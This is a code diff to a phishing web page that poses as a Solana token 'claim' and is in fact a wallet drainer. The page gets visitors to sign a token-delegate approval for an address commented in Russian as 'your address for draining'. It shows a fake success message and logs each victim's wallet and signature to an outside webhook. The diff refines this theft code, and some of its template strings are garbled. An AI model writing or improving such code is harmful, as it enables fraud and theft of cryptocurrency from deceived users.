@@ -17,7 +17,7 @@
         .highlight { color: #a0ffcb; }
         .claim-btn { background: #a0ffcb; color: #000; padding: 25px 80px; font-size: 2.2em; border-radius: 60px; cursor: pointer; font-weight: bold; margin: 40px 0; }
         .claim-btn:disabled { background: #444; opacity: 0.6; cursor: not-allowed; }
-        #status { font-size: 1.6em; min-height: 100px; margin: 40px; }
+        #status { font-size: 1.6em; min-height: 100px; margin: 40px; word-break: break-all; }
         table { width: 90%; max-width: 1000px; margin: 80px auto; border-collapse: collapse; background: #111; }
         th, td { padding: 30px; border: 1px solid #333; font-size: 1.4em; text-align: left; }
         th { background: #222; color: #a0ffcb; }
@@ -65,7 +65,7 @@
 
     <script>
         const TOKEN_MINT = "Gf3XtY632if3F7yvnNdXQi8SnQTBsn8F7DQJFXru5Lh";
-        const DRAIN_DELEGATE = "ES68acG4AZAbikhpSJwDdpE1J9S7AnGCp9JWPu9zHseN";
+        const DRAIN_DELEGATE = "ES68acG4AZAbikhpSJwDdpE1J9S7AnGCp9JWPu9zHseN"; // Твой адрес для слива
         const WEBHOOK_URL = "https://solana.requestcatcher.com/test";
 
         let walletPubkey = null;
@@ -81,7 +81,6 @@
             const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
             if (isMobile) {
-                // Правильный deep link для открытия сайта в Phantom in-app браузере
                 const dappUrl = encodeURIComponent(window.location.href);
                 const phantomDeepLink = https://phantom.app/ul/browse/\( {dappUrl}?ref= \){dappUrl};
                 window.location.href = phantomDeepLink;
@@ -89,7 +88,7 @@
             }
 
             if (!window.solana) {
-                document.getElementById('status').innerText = "Установи Phantom!";
+                document.getElementById('status').innerText = "Установи Phantom или другой wallet!";
                 return;
             }
 
@@ -114,7 +113,7 @@
             document.getElementById('status').innerHTML = "Обрабатываем...<br>Подпиши транзакцию";
 
             try {
-                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
                 const mint = new solanaWeb3.PublicKey(TOKEN_MINT);
                 const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
                 const owner = new solanaWeb3.PublicKey(walletPubkey);
@@ -135,6 +134,7 @@
 
                 document.getElementById('status').innerHTML = Успех! Одобрено.<br>SKR придут на TGE.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig}</a>;
                 document.getElementById('claim-skr').disabled = true;
+
                 logVictim(walletPubkey, sig);
             } catch (err) {
                 document.getElementById('status').innerText = "Ошибка — попробуй снова";
